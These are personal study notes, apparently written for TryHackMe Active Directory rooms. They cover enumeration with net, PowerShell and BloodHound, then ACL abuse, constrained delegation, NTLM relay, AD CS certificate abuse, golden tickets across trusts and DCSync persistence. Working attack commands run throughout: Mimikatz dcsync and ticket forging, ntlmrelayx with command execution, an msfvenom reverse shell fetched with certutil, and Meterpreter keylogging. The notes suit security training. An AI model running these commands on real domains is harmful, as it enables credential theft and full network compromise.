## Active Directory Basics

[HERE](https://github.com/OxL3on/HackTheBox/tree/main/CPTS/Active%20Directory/TryHackMe)



## Breaching Active Directory

[HERE](https://github.com/OxL3on/HackTheBox/tree/main/CPTS/Active%20Directory/TryHackMe/Breaching%20Active%20Directory)




## Enumerating Active Directory

### --------------------------------- Why AD Enumeration -----------------------------------

## **Why AD Enumeration**

- **AD Enumeration** = Collect information about Active Directory using valid credentials.
- Even low-privileged credentials can reveal useful AD details.
- Enumeration helps find privilege escalation and lateral movement paths.
- After gaining higher privileges, enumerate again to find new attack paths.

<img width="920" height="410" alt="image" src="https://github.com/user-attachments/assets/4f7699a6-f174-40dd-8a4c-670d6f312207" />

**Tools covered:**

- MMC AD Snap-ins
- CMD `net` commands
- PowerShell AD-RSAT cmdlets
- BloodHound

## **Network Setup**

**AttackBox DNS:**

```
sed -i '1s|^|nameserver THMDCIP\n|' /etc/resolv-dnsmasq
```

Replace `THMDCIP` with the Domain Controller IP.

Test DNS:

```
nslookup thmdc.za.tryhackme.com
```

Find your VPN IP and interface:

```
ip a
ifconfig
```

Use the `enumad` interface.

**Own Linux machine:**

```
sudo openvpn adenumeration.ovpn
```

`Initialization Sequence Completed` = VPN connected.

For Kali, configure DNS through Network Manager and restart:

```
sudo systemctl restart NetworkManager
```

DNS may reset on AttackBox after roughly 3 hours.

## **Get AD Credentials**

Visit: [http://distributor.za.tryhackme.com/creds](http://distributor.za.tryhackme.com/creds?utm_source=chatgpt.com)

Click **Get Credentials** to receive your first AD username and password. These credentials provide access to: `THMJMP1.za.tryhackme.com` — the jump host into the AD network.

**SSH:**

```
ssh za.tryhackme.com\\<AD Username>@thmjmp1.za.tryhackme.com
```

- RDP: Required for Tasks 2 and 3.
- SSH: Can be used for Tasks 4, 5 and 6.

**Remember:** A jump host provides access to another network segment.


### --------------------------------- Credential Injection -----------------------------------

## **Credential Injection**

**Credential injection** = Use discovered AD credentials from a Windows machine without joining it to the domain.

### **Runas**

`runas.exe` injects AD credentials into memory for network authentication.

```
runas.exe /netonly /user:<domain>\<username> cmd.exe
```

- `/netonly` – Uses injected credentials only for network connections. Local commands still use your normal Windows account.
- `/user` – Domain FQDN + username.
- `cmd.exe` – Opens a new CMD with injected credentials.

**Important:**

- It accepts any password initially because `/netonly` doesn't verify credentials with the DC immediately.
- Start your first CMD as Administrator if you need local admin privileges. This does not grant domain admin privileges.

### **DNS Configuration**

Set the Domain Controller as DNS server:

```
$dnsip = "<DC IP>"
$index = Get-NetAdapter -Name 'Ethernet' | Select-Object -ExpandProperty 'ifIndex'
Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip
```

Test DNS:

```
nslookup za.tryhackme.com
```

### **Verify Injected Credentials**

SYSVOL is a shared folder on Domain Controllers. It stores GPOs and domain-related scripts. Any authenticated AD user can read it.

```
dir \\za.tryhackme.com\SYSVOL\
```

If it lists SYSVOL contents, network authentication is working.

### **IP vs Hostname**

| Access method               | Authentication             |
| --------------------------- | -------------------------- |
| `\\za.tryhackme.com\SYSVOL` | Kerberos (attempted first) |
| `\\<DC IP>\SYSVOL`          | NTLM                       |

- Kerberos uses hostnames in its tickets.
- Using the IP forces NTLM authentication.

### **Using Injected Credentials**

All network connections from applications launched through the injected CMD use the AD credentials.

Examples:

- Authenticate to MS SQL using Windows Authentication.
- Access web applications using NTLM authentication.

**Key takeaway:** `/netonly` lets you use AD credentials for network authentication without joining your Windows machine to the domain.


### --------------------------------- Enumeration through Microsoft Management Console -----------------------------------

## **Enumeration through Microsoft Management Console (MMC)**

**MMC** uses RSAT AD Snap-ins to view and manage Active Directory through a GUI.

### **Setup**

- Connect to `THMJMP1` using RDP.
- RSAT AD Snap-ins are already installed on THMJMP1.
- On your own Windows machine, install:\
  `RSAT: Active Directory Domain Services and Lightweight Directory Tools`

### **Open MMC with Injected Credentials**

Open MMC from the CMD created using `runas /netonly`:

```
mmc.exe
```

This makes MMC use the injected AD credentials for network connections.

### **Add AD Snap-ins**

1. **File → Add/Remove Snap-in**
2. Add all three:
   - Active Directory Domains and Trusts
   - Active Directory Sites and Services
   - Active Directory Users and Computers
3. Change Forest to `za.tryhackme.com` in the first two.
4. Change Domain to `za.tryhackme.com` in Active Directory Users and Computers.
5. Right-click Active Directory Users and Computers.
6. **View → Advanced Features**

### **What Can We Enumerate?**

- **Organizational Units (OUs):** View the AD structure and departments.
- **Users:** View user properties, attributes and group memberships.
- **Computers:** Find domain-joined servers and workstations.
- **Groups:** Explore group information.
- **Search:** Quickly find AD objects.

With sufficient privileges, MMC can also modify AD objects, such as changing passwords or adding users to groups.

### **Benefits**

- GUI gives a clear overview of AD.
- Quickly search for AD objects.
- View individual object properties.
- Modify objects if permissions allow.

### **Drawbacks**

- Requires RDP access.
- Cannot efficiently collect domain-wide properties and attributes.

**Key takeaway:** MMC is useful for visually exploring AD objects, their properties, OUs and group memberships.


### --------------------------------- Enumeration through Command Prompt -----------------------------------

CMD's built-in `net` command can quickly enumerate AD information without PowerShell or external tools.

### **Users**

List all domain users:

```
net user /domain
```

Get details about a specific user:

```
net user <username> /domain
```

Shows:

- Account status and expiration
- Password settings
- Last logon
- Group memberships

**Limitation:** May fail to display all group memberships if the user belongs to more than 10 groups.

### **Groups**

List all domain groups:

```
net group /domain
```

Show members of a specific group:

```
net group "Tier 1 Admins" /domain
```

### **Password Policy**

```
net accounts /domain
```

Shows:

- Minimum password length
- Password history
- Maximum password age
- Account lockout threshold
- Lockout duration

Useful for understanding password policies and assessing password-spraying risks.

Full command reference: [https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/net-commands-on-operating-systems](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/net-commands-on-operating-systems?utm_source=chatgpt.com)

### **Benefits**

- No external tools required.
- No GUI needed.
- Simple and useful for quick enumeration.

### **Drawbacks**

- Must run from a domain-joined machine.
- May not display all information, such as users' complete group memberships.

**Key takeaway:** `net user`, `net group` and `net accounts` are the main CMD commands for enumerating AD users, groups and password policies.


### --------------------------------- Enumeration through PowerShell -----------------------------------

PowerShell provides **AD-RSAT cmdlets** to enumerate more AD information than CMD's `net` commands.

- AD-RSAT provides 50+ Active Directory cmdlets.
- Start PowerShell from SSH using:

```
powershell
```

### **Users –&#x20;**`Get-ADUser`

Get all properties of a user:

```
Get-ADUser -Identity gordon.stevens -Server za.tryhackme.com -Properties *
```

Search users by name:

```
Get-ADUser -Filter 'Name -like "*stevens"' -Server za.tryhackme.com | Format-Table Name,SamAccountName -A
```

- `-Identity` – User account.
- `-Properties *` – Show all properties.
- `-Server` – Specify Domain Controller.
- `-Filter` – Filter results.

### **Groups**

Get group information:

```
Get-ADGroup -Identity Administrators -Server za.tryhackme.com
```

Get group members:

```
Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com
```

### **AD Objects –&#x20;**`Get-ADObject`

Find objects changed after a date:

```
$ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)
Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com
```

Find accounts with failed password attempts:

```
Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com
```

Useful for identifying accounts that may be closer to their lockout threshold.

### **Domain Information –&#x20;**`Get-ADDomain`

```
Get-ADDomain -Server za.tryhackme.com
```

Shows domain details, DNS name, domain controllers container, users container and more.

### **Modifying AD Objects**

`Set-ADAccountPassword` can change an account's password:

```
Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
```

This is AD exploitation, not enumeration.

### **Benefits**

- Retrieves more information than CMD `net` commands.
- Works from non-domain-joined machines using `-Server` and injected credentials.
- Supports custom cmdlets.
- Can modify AD objects with sufficient permissions.

### **Drawbacks**

- More likely to be monitored by Blue Teams.
- Requires AD-RSAT or other PowerShell scripts.

**Key commands to remember:**

| Cmdlet                  | Purpose                |
| ----------------------- | ---------------------- |
| `Get-ADUser`            | Enumerate users        |
| `Get-ADGroup`           | Enumerate groups       |
| `Get-ADGroupMember`     | List group members     |
| `Get-ADObject`          | Enumerate AD objects   |
| `Get-ADDomain`          | Get domain information |
| `Set-ADAccountPassword` | Change password        |

Source: [AD PowerShell cmdlets](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps\&utm_source=chatgpt.com)


### --------------------------------- Enumeration through Bloodhound -----------------------------------

## **BloodHound Enumeration**

**BloodHound:** Visualizes AD as a graph to find attack paths.

**SharpHound:** Collects AD data.\
**BloodHound:** Displays collected data.\
**Neo4j:** Graph database used by BloodHound.

### **SharpHound Collectors**

| Collector        | Purpose              |
| ---------------- | -------------------- |
| `SharpHound.ps1` | PowerShell collector |
| `SharpHound.exe` | Windows executable   |
| `AzureHound.ps1` | Azure enumeration    |

BloodHound and SharpHound versions should match. This room uses **BloodHound v4.1.0**.

### **Run SharpHound**

Location: `C:\Tools\`

```
copy C:\Tools\SharpHound.exe ~\Documents\
cd ~\Documents\
```

Full enumeration:

```
SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs
```

Session-only enumeration:

```
SharpHound.exe --CollectionMethods Session --Domain za.tryhackme.com --ExcludeDCs
```

Parameters:

- `All` – Collects AD information.
- `Session` – Collects user session information.
- `--Domain` – Target domain.
- `--ExcludeDCs` – Excludes Domain Controllers.

Output: Timestamped `BloodHound.zip` containing collected data.

### **Start BloodHound**

Start Neo4j:

```
neo4j console start
```

Another terminal:

```
bloodhound --no-sandbox
```

Default credentials: `neo4j:neo4j`

Copy ZIP from THMJMP1:

```
scp <AD Username>@THMJMP1.za.tryhackme.com:C:/Users/<AD Username>/Documents/<Sharphound ZIP> .
```

Drag and drop ZIP into BloodHound to import.

### **BloodHound Important Terms**

| Term        | Meaning                                 |
| ----------- | --------------------------------------- |
| Nodes       | AD objects (users, groups, computers)   |
| Edges       | Relationships/permissions between nodes |
| Attack Path | Possible route to reach a target        |

**Node Info:**

- Overview – Sessions and high-value targets.
- Node Properties / Extra Properties – Account details.
- Group Membership – User's groups.
- Local Admin Rights – Hosts where user has admin access.
- Execution Rights – RDP and other execution permissions.
- Outbound Control Rights – Objects the user can modify.
- Inbound Control Rights – Objects that can modify the user.

**Analysis Query:** `Find all Domain Admins`

Nested groups matter: `Tier 0 Admins` inside `Domain Admins` means Tier 0 members effectively have Domain Admin privileges.

### **Attack Path Example**

Start: Your AD user.\
End: `Tier 1 Admins`.

Example path: Domain Users can RDP into `THMJMP1`, where a Tier 1 Admin has an active session. This reveals a possible route to higher privileges.

### **Session Updates**

AD structure changes slowly, but active sessions change frequently.

Recommended:

- First run: `All`
- At least twice daily: `Session` (around 10:00 and 14:00).
- Before importing new session data: **Database Info → Clear Session Information**.

### **Benefits / Drawback**

Benefits: GUI visualization, attack paths, detailed AD relationships.

Drawback: SharpHound is noisy and may trigger AV/EDR.

**Reference:** BloodHound documentation (mentioned in the THM section).




## Exploiting Active Directory

### --------------------------------- Exploiting Permission Delegation -----------------------------------

## **Exploiting Permission Delegation**

**Permission Delegation:** Gives users specific permissions over AD objects. Misconfigured permissions can lead to privilege escalation. Also called **ACL-based attacks**.

**ACE** = Access Control Entry (permission).\
**DACL** = List of ACEs controlling access to an object.

### **Important ACEs**

| ACE                   | Permission                                            |
| --------------------- | ----------------------------------------------------- |
| `ForceChangePassword` | Reset password without knowing old password           |
| `AddMembers`          | Add users/groups to a group                           |
| `GenericAll`          | Full control over object                              |
| `GenericWrite`        | Modify non-protected attributes                       |
| `WriteOwner`          | Change object owner                                   |
| `WriteDACL`           | Modify object's permissions                           |
| `AllExtendedRights`   | Perform extended AD actions, including password reset |

References: [BloodHound ACE documentation](https://bloodhound.specterops.io/resources/edges/overview?utm_source=chatgpt.com) · [AD-RSAT](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps\&utm_source=chatgpt.com) · [PowerSploit](https://github.com/PowerShellMafia/PowerSploit?utm_source=chatgpt.com)

### **BloodHound Setup**

```
neo4j console start
```

Another terminal:

```
bloodhound --no-sandbox
```

Credentials: `neo4j:neo4j`

Task ZIP location:\
`/root/Rooms/ExploitingAD/`

Import both ZIP files into BloodHound.

Previous room: [https://tryhackme.com/room/adenumeration](https://tryhackme.com/room/adenumeration?utm_source=chatgpt.com)

### **Attack Path: Domain Users → Tier 2 Admins**

Misconfiguration:

- `Domain Users` has `AddMembers` over `IT Support`.
- `IT Support` has `ForceChangePassword` over `Tier 2 Admins`.

**1. Add yourself to IT Support**

```
Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username"
```

Verify:

```
Get-ADGroupMember -Identity "IT Support"
```

**2. Find Tier 2 Admins**

```
Get-ADGroupMember -Identity "Tier 2 Admins"
```

**3. Reset a Tier 2 Admin's password**

```
$Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force
Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password
```

If `Access Denied`, permissions may not have propagated yet. Wait up to 10 minutes, reconnect and retry. You can also try:

```
gpupdate /force
```

**Result:** Use the target account's new password to authenticate to `THMWRK1` with Tier 2 administrative access.

**Key takeaway:** Misconfigured `AddMembers` + `ForceChangePassword` permissions can create a privilege escalation path.


### --------------------------------- Exploiting Kerberos Delegation -----------------------------------

## **Kerberos Delegation**

**Kerberos Delegation:** Allows a service to access another service on behalf of a user (e.g. Web Server → SQL Server).

### **Types of Delegation**

| Type          | Meaning                                                     |
| ------------- | ----------------------------------------------------------- |
| Unconstrained | No service restrictions; user's TGT can be stored in memory |
| Constrained   | Delegation restricted to specified services                 |
| RBCD          | Target service controls which accounts can delegate to it   |

Common services: `HTTP`, `CIFS`, `LDAP`, `HOST`, `MSSQL`.

**Important:** Unconstrained delegation can expose privileged users' TGTs. RBCD uses `msDS-AllowedToActOnBehalfOfOtherIdentity`.

### **Constrained Delegation Exploitation**

**1. Find delegation accounts (PowerView):**

```
Import-Module C:\Tools\PowerView.ps1
Get-NetUser -TrustedToAuth
```

Result: `svcIIS` can delegate `HTTP` and `WSMAN` on `THMSERVER1`.

**2. Dump service credentials (Mimikatz):**

```
C:\Tools\mimikatz_trunk\x64\mimikatz.exe
```

```
token::elevate
lsadump::secrets
```

`token::elevate` = SYSTEM token.\
`lsadump::secrets` = Extract LSA secrets, including service credentials.

Example discovered service: `svcIIS`.

**3. Generate TGT (Kekeo):**

```
C:\Tools\kekeo\x64\kekeo.exe
```

```
tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:<password>
```

Generates a TGT for the delegation account.

**4. Generate TGS using S4U:**

```
tgs::s4u /tgt:<TGT_FILE> /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
```

Run again with:

```
/service:wsman/THMSERVER1.za.tryhackme.loc
```

`/user` = account to impersonate. `/service` = target service.

**5. Import tickets (Mimikatz):**

```
privilege::debug
kerberos::ptt <WSMAN_TGS_FILE>
kerberos::ptt <HTTP_TGS_FILE>
```

`kerberos::ptt` = Pass the Ticket (load Kerberos ticket into memory).

Verify:

```
klist
```

**6. Connect to server:**

```
New-PSSession -ComputerName thmserver1.za.tryhackme.loc
Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
whoami
```

Result: Access to `THMSERVER1` as `za\t1_trevor.jones`.

**Key takeaway:** Constrained delegation can allow impersonation of another user to access specifically permitted services.


### --------------------------------- Exploiting Automated Relays -----------------------------------

## **Exploiting Automated Relays**

**Authentication Relay:** Capture an authentication attempt and forward it to another machine to gain access.

### **Machine Accounts**

Every Windows host has a machine account (`HOSTNAME$`).

- Password: 120 characters (UTF-16).
- Automatically rotates every 30 days.
- Some machine accounts have administrative rights over other machines.

### **Find Machine Admin Relationships (BloodHound)**

Custom Cypher query:

```
MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p
```

Finds computers whose groups have administrative access to other computers.

Example: `THMSERVER2$` has admin privileges over `THMSERVER1`.

### **Printer Bug (MS-RPRN)**

Forces a target's Print Spooler service to authenticate to an arbitrary IP.

Requirements:

1. Valid AD credentials.
2. Network access to target SMB.
3. Target Print Spooler running.
4. SMB signing not enforced.

Check Print Spooler:

```
GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc
```

Alternative:

```
Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc
```

Check SMB signing:

```
nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc
```

`Message signing enabled but not required` = signing is allowed, not enforced.

### **Tools and Commands**

**Tools:** [SpoolSample](https://github.com/leechristensen/SpoolSample?utm_source=chatgpt.com) · [Impacket](https://github.com/SecureAuthCorp/impacket?utm_source=chatgpt.com) · [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py?utm_source=chatgpt.com)

The lab's relay example:

```
python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -debug
```

Coerce authentication from THMSERVER2:

```
SpoolSample.exe THMSERVER2.za.tryhackme.loc "Attacker IP"
```

Relay with command execution:

```
python3.9 ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -c 'whoami /all' -debug
```

- `-smb2support` – Enable SMB2 support.
- `-t` – Relay target.
- `-c` – Execute command.
- `-debug` – Debug output.

Using the IP instead of hostname helps force NTLM rather than Kerberos authentication.

**Result:** Successful relay can execute commands as `NT AUTHORITY\SYSTEM` on THMSERVER1. Without `-c`, the tool can perform a hashdump.

**Note:** Printer Spooler coercion can be unstable and may crash the service. A callback is not guaranteed.


### --------------------------------- Exploiting AD Users -----------------------------------

## **Exploiting AD Users**

**User targeting:** Users are a weak link due to weak passwords, bad habits and credential storage.

Main targets:

- **Credential Management:** Find stored credentials (e.g., KeePass `.kdbx` database).
- **Keylogging:** Capture user keystrokes to discover credentials and understand user activity.

### **1. Hunting for Credentials**

- On compromised `THMSERVER1`, inspect user directories for `.kdbx` files.
- Use Meterpreter `download` to retrieve the KeePass database.
- Database is password-protected; keylogging may reveal its password.

### **2. Meterpreter Keylogging**

**Why migrate?** SYSTEM usually has no user keystrokes. Migrate to the target user's process.

Generate payload:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=exploitad LPORT="Listening port" -f psh -o shell.ps1
```

Create listener:

```
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST exploitad; set LPORT "listening port'; exploit"
```

Host payload with Python webserver, then download:

```
certutil.exe -urlcache -split -f http:///shell.ps1
```

Find user's Explorer process:

```
ps | grep "explorer"
```

Example: `explorer.exe`, PID `3612`, user `THMSERVER1\trevor.local`.

If Explorer is missing:

```
net user trevor.local <chosen password>
```

```
C:\auto-login.ps1 trevor.local <chosen password> THMSERVER1
```

```
shutdown -r
```

Migrate and verify:

```
migrate 3612
getuid
```

Expected user: `THMSERVER1\trevor.local`.

Start and dump keylogger:

```
keyscan_start
keyscan_dump
```

Example captured keystrokes:

```
keep<CR>
<Shift>Passwordpasswordpassword<CR>
```

### **3. KeePass**

- Open `.kdbx` using KeePass on AttackBox.
- Own VM: `sudo apt install keepassx` or download from [KeePass](https://keepass.info/download.html?utm_source=chatgpt.com).
- On Kali, ensure the `kali` user owns the database file before opening it.

**Reference:** [Metasploit module](https://tryhackme.com/module/metasploit?utm_source=chatgpt.com).

**Key takeaway:** Include credential hunting and keylogging in AD exploitation.


### --------------------------------- Exploiting GPOs -----------------------------------

## **Exploiting GPOs**

**GPO (Group Policy Object):** Centralized Windows policy settings applied to AD users/computers (e.g., firewall, antivirus, local groups, startup scripts, SMB settings).

- GPOs are stored in **SYSVOL**, identified by unique GUIDs.
- Domain computers periodically pull and apply policies (default: every **15 minutes**).
- `gpupdate` manually applies updated policies.

### **1. Find Vulnerable GPO**

- BloodHound shows `svcServMan` has **Ownership** over a GPO.
- The GPO is applied to `THMSERVER2`.
- GPO ownership allows modifying its configuration.

### **2. Inject Credentials and Open MMC**

Run from an administrative CMD on `THMWRK1`:

```
runas /netonly /user:za.tryhackme.loc\<AD Username> cmd.exe
```

Verify credentials:

```
dir \\za.tryhackme.loc\sysvol
```

Open MMC:

```
mmc
```

Add **Group Policy Management** snap-in:

`File → Add/Remove Snap-in → Group Policy Management → Add → OK`

Navigate to:

`Servers → Management Servers → Management Server Pushes`

Right-click the target GPO → **Edit**.

### **3. Modify Local Groups**

Navigate:

`Computer Configuration → Policies → Windows Settings → Security Settings → Restricted Groups`

1. Right-click **Restricted Groups** → Add Group.
2. Browse → enter `IT Support` → Check Names → OK twice.
3. Configure the second filter to include:
   - `Administrators`
   - `Remote Desktop Users`
4. Apply → OK.

If IT Support already exists, inspect its configuration or recreate it.

### **Result**

- Wait up to **15 minutes** for GPO replication/application.
- Members of `IT Support` gain local Administrator and Remote Desktop access on `THMSERVER2`.
- Connect through RDP or use other lateral movement methods.

**Key takeaway:** Writable GPOs can grant controlled AD accounts local admin and RDP access to every computer where that GPO applies.


### --------------------------------- Exploiting Certificates -----------------------------------

## **Exploiting Certificates (AD CS)**

**AD CS:** Microsoft's PKI implementation used for certificate issuance, encryption, digital signatures and authentication. Misconfigured certificate templates can allow privilege escalation and user impersonation.

### **1. Important Terms**

| Term                 | Meaning                                        |
| -------------------- | ---------------------------------------------- |
| PKI                  | Manages certificates and public-key encryption |
| AD CS                | Microsoft's PKI implementation                 |
| CA                   | Certificate Authority; issues certificates     |
| Certificate Template | Defines certificate rules and permissions      |
| CSR                  | Certificate Signing Request                    |
| EKU                  | Defines how a certificate can be used          |

### **2. Find Vulnerable Templates**

Enumerate templates:

```
certutil -Template -v > templates.txt
```

Vulnerable template conditions (poisonous combination):

- **Client Authentication:** Certificate supports client authentication.
- **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT:** Requester can specify SAN.
- **CTPRIVATEKEY_FLAG_EXPORTABLE_KEY:** Private key is exportable.
- **Certificate Permissions:** Attacker has enrollment permissions.

Room target: `Template[32]` — `THMSERVER2` machine account can request a certificate with custom SAN and Client Authentication.

Tool: `PSPKIAudit` (GhostPack).

### **3. Request Certificate Through MMC**

On `THMSERVER2` via RDP:

`Start → Run → mmc → File → Add/Remove Snap-in → Certificates → Computer Account → Local Computer → OK`

Request certificate:

1. Right-click **Personal → All Tasks → Request New Certificate**.
2. Next twice; select AD enrollment policy.
3. Click **More Information**.
4. Subject Name Type: `Common Name` → enter any value → Add.
5. Alternative Name Type: `User principal name`.
6. Enter target DA UPN: `Administrator@za.tryhackme.loc` → Add.
7. Apply → OK → Enroll.

Export certificate:

`Right-click certificate → All Tasks → Export`

- Select **Yes, export the private key**.
- Set a password.
- Choose save location → Finish.

If using Remmina, disable Restricted Admin mode.

### **4. Request Kerberos TGT with Rubeus**

```
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<path to certificate> /password:<certificate file password> /outfile:<name of file to write TGT to> /domain:za.tryhackme.loc /dc:<IP of domain controller>
```

Example:

```
.\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:12.31.1.101
```

Parameters:

- `/user` — Impersonated user; must match certificate UPN.
- `/enctype` — Ticket encryption type; AES256 avoids weak default encryption.
- `/certificate` — Certificate path.
- `/password` — Certificate password.
- `/outfile` — Output TGT file.
- `/domain` — Target domain FQDN.
- `/dc` — Domain Controller IP (prefer one running CA).

### **5. Load TGT Using Mimikatz**

```
mimikatz.exe
```

```
privilege::debug
kerberos::ptt administrator.kirbi
exit
```

- `privilege::debug` — Enable debug privilege.
- `kerberos::ptt` — Pass the ticket into the current session.

Verify access:

```
dir \\THMDC.za.tryhackme.loc\c$\
```



Result

&#x20;DA impersonation gives access to `THMDC` and compromises the full child domain (Tier 0).



**Key takeaway:** Misconfigured AD CS templates can let an attacker request a certificate for a privileged user, obtain their Kerberos TGT, and impersonate them.


### --------------------------------- Exploiting Domain Trusts -----------------------------------

## **Exploiting Domain Trusts**

**Goal:** Compromise the parent/root domain (`TRYHACKME.LOC`) through the compromised child domain (`ZA.TRYHACKME.LOC`).

### **1. Domain Trusts**

A trust allows users in one domain to access resources in another.

- **Directional:** Trust flows from the trusting domain to the trusted domain.
- **Transitive:** Trust extends beyond two domains to other trusted domains.
- Parent-child trusts are bidirectional by default.

Example: `ZA.TRYHACKME.LOC` ↔ `TRYHACKME.LOC` ↔ `UK.TRYHACKME.LOC`.

### **2. KRBTGT & Golden Ticket**

`KRBTGT` is the Kerberos service account. Its hash encrypts/signs domain TGTs and is shared across domain controllers.

**Golden Ticket:** Forge your own TGT by bypassing the KDC.

Required information:

1. Domain FQDN
2. Domain SID
3. Impersonated username
4. KRBTGT password hash

Extract KRBTGT hash using Mimikatz DCSync:

```
privilege::debug
lsadump::dcsync /user:za\krbtgt
```

### **3. Inter-Realm TGT**

Add the parent domain's **Enterprise Admins (EA) SID** as an extra SID in a forged child-domain Golden Ticket.

- EA membership grants administrative access across the forest.
- Default EA SID ends in `-519`.
- Required SIDs:
  - Child DC (`THMDC`) SID.
  - Parent EA group SID.

Get child DC SID:

```
Get-ADComputer -Identity "THMDC"
```

Example:\
`S-1-5-21-3885271727-2693558621-2658995185-1001`

Get parent EA SID:

```
Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc
```

Example:\
`S-1-5-21-3330634377-1326264276-632209373-519`

### **4. Forge Golden Ticket with Extra SID**

```
privilege::debug
kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:<Password hash of krbtgt user> /sids:<SID of Enterprise Admins group> /ptt
```

Important parameters:

- `/user` — Impersonated account.
- `/domain` — Child domain.
- `/sid` — Child domain SID.
- `/service:krbtgt` — Create TGT.
- `/rc4` — KRBTGT NTLM hash.
- `/sids` — Parent Enterprise Admins SID.
- `/ptt` — Inject ticket into current session.

### **5. Verify Access**

Child DC:

```
dir \\thmdc.za.tryhackme.loc\c$
```

Parent/root DC:

```
dir \\thmrootdc.tryhackme.loc\c$
```



Result

&#x20;Access to both DCs confirms compromise of the parent domain through the child domain.



**Key takeaway:** A forged child-domain Golden Ticket containing the parent Enterprise Admins SID can exploit bidirectional domain trust to compromise the entire AD forest.




## Persisting Active Directory

### --------------------------------- Persistence through Credentials -----------------------------------

## **Persistence through Credentials**

**Goal:** Maintain access using harvested credentials, even if privileged accounts get reset.

### **1. Domain Administrator Credentials**

- Username: `Administrator`
- Password: `tryhackmewouldnotguess1@`
- Domain: `ZA`

### **2. DC Synchronization (DCSync)**

- **KCC (Knowledge Consistency Checker):** Creates AD replication topology between DCs.
- **DC Sync:** Replicates AD data between domain controllers through RPC.
- Accounts with domain replication permissions (e.g., Domain Admins) can request replication and extract password hashes.

### **3. Which Credentials to Keep?**

Prefer near-privileged accounts because Domain Admin credentials are usually rotated first.

- Users with local Administrator rights on multiple machines.
- Service accounts with delegation permissions.
- Privileged service accounts (Exchange, WSUS, SCCM).

### **4. DCSync Single Account**

SSH into `THMWRK1` using DA credentials, then run:

```
C:\Tools\mimikatz_trunk\x64\mimikatz.exe
```

```
lsadump::dcsync /domain:za.tryhackme.loc /user:<Your low-privilege AD Username>
```

Returns account information, including NTLM hash and other credential material.

Verify NTLM hash: [NTLM Hash Generator](https://codebeautify.org/ntlm-hash-generator?utm_source=chatgpt.com).

### **5. DCSync All Accounts**

Enable Mimikatz logging:

```
log <username>_dcdump.txt
```

Dump all accounts:

```
lsadump::dcsync /domain:za.tryhackme.loc /all
```

Exit Mimikatz to finalize the log, then download `<username>_dcdump.txt`.

Extract usernames and hashes:

```
cat <username>_dcdump.txt | grep "SAM Username"
cat <username>_dcdump.txt | grep "Hash NTLM"
```

Use the hashes for offline password cracking or Pass-the-Hash.

**Key takeaway:** DCSync can retrieve domain account hashes. Persisting through near-privileged accounts may provide longer-lasting access than relying only on Domain Admin credentials.


### --------------------------------- Persistence through Tickets -----------------------------------

## **Persistence through Tickets**

### **1. Kerberos Authentication Recap**

1. User sends **AS-REQ** to KDC to request a TGT.
2. DC verifies the user and returns a TGT signed with the `KRBTGT` hash.
3. User sends TGT to DC to request a **TGS** for a service.
4. DC returns a TGS encrypted with the service account's hash.
5. User presents TGS to the service for access.

<img width="808" height="566" alt="image" src="https://github.com/user-attachments/assets/31cd8ba9-b098-430a-834a-18f52468209a" />

### **2. Golden Ticket (Forged TGT)**

**Required:** KRBTGT NTLM hash, domain name, domain SID and user RID.

- Bypasses initial user authentication with the DC.
- No need for the impersonated user's password/hash.
- Can impersonate disabled, deleted or non-existent users (account validation occurs only if the account is older than 20 minutes).
- Ticket lifetime can be customized.
- KRBTGT password normally never changes.
- Blue team must rotate KRBTGT password **twice** to invalidate existing tickets.
- Can bypass smart-card authentication.
- Can be generated from a non-domain-joined machine.

### **3. Silver Ticket (Forged TGS)**

**Required:** Target machine account's NTLM hash, domain SID and user RID.

- Bypasses communication with the KDC.
- TGS is signed using the target machine account's hash.
- Access is limited to the targeted service on that host.
- No DC authentication logs; harder to detect.
- Can impersonate non-existent users by including required group SIDs.
- Machine account passwords normally rotate every 30 days.
- Machine accounts can also be used as normal AD accounts.

| Golden Ticket               | Silver Ticket         |
| --------------------------- | --------------------- |
| Forged TGT                  | Forged TGS            |
| KRBTGT hash                 | Machine account hash  |
| Broad domain access         | Specific host/service |
| DC involved in TGS requests | No KDC communication  |

### **4. Collect Required Information**

Get domain SID:

```
Get-ADDomain
```

Example:\
`S-1-5-21-3885271727-2693558621-2658995185`

Also collect:

- KRBTGT NTLM hash from previous DCSync.
